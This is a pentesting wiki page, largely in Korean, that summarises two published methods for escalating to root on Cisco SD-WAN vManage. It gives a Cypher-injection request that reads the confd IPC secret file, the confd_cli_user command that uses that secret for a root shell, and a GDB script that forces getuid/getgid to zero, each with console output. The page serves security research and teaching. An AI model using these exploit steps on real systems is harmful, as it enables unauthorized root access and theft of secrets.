# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

조금 더 파고들어 `confd` 및 다양한 바이너리와 관련된 [문서](http://66.218.245.39/doc/html/rn03re18.html)를 살펴본 결과, IPC 소켓을 인증하기 위해 `/etc/confd/confd_ipc_secret`에 위치한 비밀을 사용한다는 것을 발견했습니다:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
우리의 Neo4j 인스턴스를 기억하나요? `vmanage` 사용자의 권한으로 실행되고 있어, 이전 취약점을 사용하여 파일을 검색할 수 있습니다:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 프로그램은 명령줄 인수를 지원하지 않지만 인수와 함께 `/usr/bin/confd_cli_user`를 호출합니다. 따라서 우리는 자신의 인수 집합으로 `/usr/bin/confd_cli_user`를 직접 호출할 수 있습니다. 그러나 현재 권한으로는 읽을 수 없으므로 rootfs에서 이를 검색하고 scp를 사용하여 복사한 후, 도움말을 읽고 이를 사용하여 셸을 얻어야 합니다:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv 팀의 블로그¹는 루트 셸을 얻는 우아한 방법을 설명했지만, 단점은 `/usr/bin/confd_cli_user`의 복사본을 얻어야 하며 이는 루트만 읽을 수 있습니다. 나는 이러한 번거로움 없이 루트로 상승하는 또 다른 방법을 찾았습니다.

`/usr/bin/confd_cli` 바이너리를 분해했을 때, 나는 다음과 같은 것을 관찰했습니다:
```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
“ps aux”를 실행했을 때, 다음을 관찰했습니다 (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
나는 “confd_cli” 프로그램이 로그인한 사용자로부터 수집한 사용자 ID와 그룹 ID를 “cmdptywrapper” 애플리케이션에 전달한다고 가정했다.

내 첫 번째 시도는 “cmdptywrapper”를 직접 실행하고 `-g 0 -u 0`을 제공하는 것이었지만 실패했다. 어딘가에서 파일 설명자(-i 1015)가 생성된 것 같고, 이를 위조할 수 없다.

synacktiv의 블로그(마지막 예제)에서 언급했듯이, `confd_cli` 프로그램은 명령줄 인수를 지원하지 않지만, 디버거를 통해 영향을 줄 수 있으며, 다행히 GDB가 시스템에 포함되어 있다.

나는 API `getuid`와 `getgid`가 0을 반환하도록 강제하는 GDB 스크립트를 만들었다. 이미 deserialization RCE를 통해 “vmanage” 권한을 가지고 있으므로, `/etc/confd/confd_ipc_secret`를 직접 읽을 수 있는 권한이 있다.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
콘솔 출력:
```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
{{#include ../../banners/hacktricks-training.md}}
